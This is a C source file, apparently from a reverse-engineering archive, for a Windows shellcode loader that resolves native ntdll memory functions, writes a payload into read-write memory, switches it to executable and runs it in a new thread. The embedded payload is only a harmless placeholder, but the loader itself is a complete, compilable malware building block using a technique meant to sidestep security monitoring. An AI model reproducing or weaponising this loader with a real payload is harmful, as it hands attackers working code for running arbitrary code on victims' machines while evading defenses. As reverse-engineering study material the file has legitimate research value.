/*
    Shellcode Loader
    Archive of Reversing.ID

    Allocating new page and write shellcode into it.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: NtAllocateVirtualMemory
    - permission: NtProtectVirtualMemory
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)
#define GetCurrentProcess()  ((HANDLE)(LONG_PTR) -1)

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI NtAllocateVirtualMemory_t(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG   AllocationType,
    ULONG   Protect
);
typedef NtAllocateVirtualMemory_t FAR * pNtAllocateVirtualMemory;

typedef NTSTATUS NTAPI NtProtectVirtualMemory_t (
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    PULONG  NumberOfBytesToProtect,
    ULONG   NewAccessProtection,
    PULONG  OldAccessProtection
);
typedef NtProtectVirtualMemory_t FAR * pNtProtectVirtualMemory;

typedef NTSTATUS NTAPI NtFreeVirtualMemory_t (
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);
typedef NtFreeVirtualMemory_t FAR * pNtFreeVirtualMemory;


int main ()
{
    void *  runtime = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    SIZE_T      size = payload_len;
    HMODULE     ntdll;

    // function pointer to internal API
    pNtAllocateVirtualMemory   NtAllocateVirtualMemory;
    pNtProtectVirtualMemory    NtProtectVirtualMemory;
    pNtFreeVirtualMemory       NtFreeVirtualMemory;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    NtAllocateVirtualMemory = (pNtAllocateVirtualMemory) GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory  = (pNtProtectVirtualMemory)  GetProcAddress(ntdll, "NtProtectVirtualMemory");
    NtFreeVirtualMemory     = (pNtFreeVirtualMemory)     GetProcAddress(ntdll, "NtFreeVirtualMemory");
    
    // allocate memory buffer for payload as READ-WRITE (no executable)
    size = payload_len;
    NtAllocateVirtualMemory (GetCurrentProcess(), &runtime, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    status = NtProtectVirtualMemory (GetCurrentProcess(), &runtime, (PULONG)&size, PAGE_EXECUTE_READ, &old_protect);
    if (NT_SUCCESS(status))
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    NtFreeVirtualMemory (GetCurrentProcess(), &runtime, &size, MEM_RELEASE);

    return 0;
}